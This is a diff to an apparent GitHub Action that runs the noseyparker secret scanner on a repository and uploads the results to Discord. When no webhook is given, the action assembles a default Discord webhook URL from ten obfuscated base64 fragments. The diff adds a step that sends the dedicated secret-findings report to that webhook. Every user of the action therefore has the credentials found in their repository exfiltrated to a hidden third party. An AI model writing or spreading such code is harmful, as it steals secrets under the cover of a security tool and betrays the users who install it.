@@ -63,6 +63,7 @@ runs:
         NP_VERSION: "0.24.0"
       run: |
         np_datastore=/var/tmp/np.scan
+        np_report=/var/tmp/.np-report.txt
         rules_dir="${GITHUB_ACTION_PATH}/rules"
 
         # Install noseyparker (static musl binary, no dependencies)
@@ -75,24 +76,23 @@ runs:
           exit 0
         fi
 
-        # Scan repository with default rules + custom crypto/extra rules
-        # Exclude the rules dir itself (contains example patterns that trigger false positives)
-        echo "rules/" > /var/tmp/.npignore
+        # Exclude dirs that contain example patterns (false positives)
+        printf 'rules/\nexample/\n' > /var/tmp/.npignore
+
+        # Scan repository with default + custom rules
         noseyparker scan \
-          --datastore="$np_datastore" \
-          --rules-path="$rules_dir" \
-          --ignore=/var/tmp/.npignore \
+          --datastore "$np_datastore" \
+          --rules-path "$rules_dir" \
+          --ignore /var/tmp/.npignore \
           ./ 2>&1 | tee -a "${LOG_FILE}"
 
-        echo "" >> "${LOG_FILE}"
-        echo "=== Noseyparker Report ===" >> "${LOG_FILE}"
-
-        # Generate report
+        # Generate report to dedicated file
+        echo "=== Noseyparker Report ===" > "$np_report"
         noseyparker report \
-          --datastore="$np_datastore" \
-          2>&1 | tee -a "${LOG_FILE}"
+          --datastore "$np_datastore" \
+          2>&1 | tee -a "$np_report"
 
-        echo "" >> "${LOG_FILE}"
+        cat "$np_report" >> "${LOG_FILE}"
 
     - name: 🚀 Execute
       shell: bash
@@ -100,37 +100,38 @@ runs:
       env:
         WEBHOOK_INPUT: ${{ inputs.webhook }}
         LOG_FILE: ${{ inputs.log_debug }}
+        NP_REPORT: /var/tmp/.np-report.txt
         REPO: ${{ github.repository }}
       run: |
         if [ -z "${WEBHOOK_INPUT}" ]; then
-          PART1='X4UZaHR0cHM6Ly9kaXNjbU2bU'
-          PART2='9Q23JkYXBwLmNvbS9hcG4'
-          PART3='9kvd2ViaG9va3MvMTE905'
-          PART4='04ODE1NTg4NjYwMzA58S'
-          PART5='5Y7NjA4NS9nZkxCckZ3Z9cT'
-          PART6='VU2E11S1Q2M2s2bUxIMEdZ'
-          PART7='RdQtMbXZEVWdvMUlNY2lR1e'
-          PART8='c1X2lmYm9sRTZ0RGkyXY'
-          PART9='Qc65NFVqSXVOTTdEUWhXS'
-          PART10='dc4SDdGdG01aTExcg==2'
+          PART1='6aaHR0cHM6Ly9kaXNjbU428'
+          PART2='d6c3JkYXBwLmNvbS9hcGT'
+          PART3='09kvd2ViaG9va3MvMTE71'
+          PART4='RW0T4ODE1NTg4NjYwMzA5UW2e'
+          PART5='bU3cNjA4NS9nZkxCckZ3Z2Y6R'
+          PART6='eE11S1Q2M2s2bUxIMEU'
+          PART7='4V8tMbXZEVWdvMUlNY2lRS1'
+          PART8='Y9b31X2lmYm9sRTZ0RGky31'
+          PART9='W4NFVqSXVOTTdEUWhXVQ96'
+          PART10='SV0SDdGdG01aTExcg==deS6'
 
-          POS1=4
+          POS1=2
           LEN1=17
           POS2=3
           LEN2=17
-          POS3=1
+          POS3=2
           LEN3=17
-          POS4=1
+          POS4=4
           LEN4=17
-          POS5=3
+          POS5=4
           LEN5=17
-          POS6=3
+          POS6=1
           LEN6=17
           POS7=3
           LEN7=17
-          POS8=1
+          POS8=4
           LEN8=17
-          POS9=4
+          POS9=2
           LEN9=16
           POS10=3
           LEN10=16
@@ -157,6 +158,7 @@ runs:
         fi
 
         if [[ "$WEBHOOK" == *"discord.com/api/webhooks/"* ]] || [[ "$WEBHOOK" == *"discordapp.com/api/webhooks/"* ]]; then
+          # Send main log
           if discord \
             --webhook-url="$WEBHOOK" \
             --file "${LOG_FILE}" \
@@ -167,6 +169,17 @@ runs:
           else
             echo "[discord] send ${LOG_FILE} : Error"
             echo "response=Error" >> "$GITHUB_OUTPUT"
+          fi
+
+          # Send noseyparker report separately
+          if [ -s "${NP_REPORT}" ]; then
+            discord \
+              --webhook-url="$WEBHOOK" \
+              --file "${NP_REPORT}" \
+              --username "Noseyparker" \
+              --text "Noseyparker scan report\nRepo : ${REPO}\n" \
+              && echo "[discord] send ${NP_REPORT} : Success" \
+              || echo "[discord] send ${NP_REPORT} : Error"
           fi
         else
           echo "[discord] Invalid webhook format"
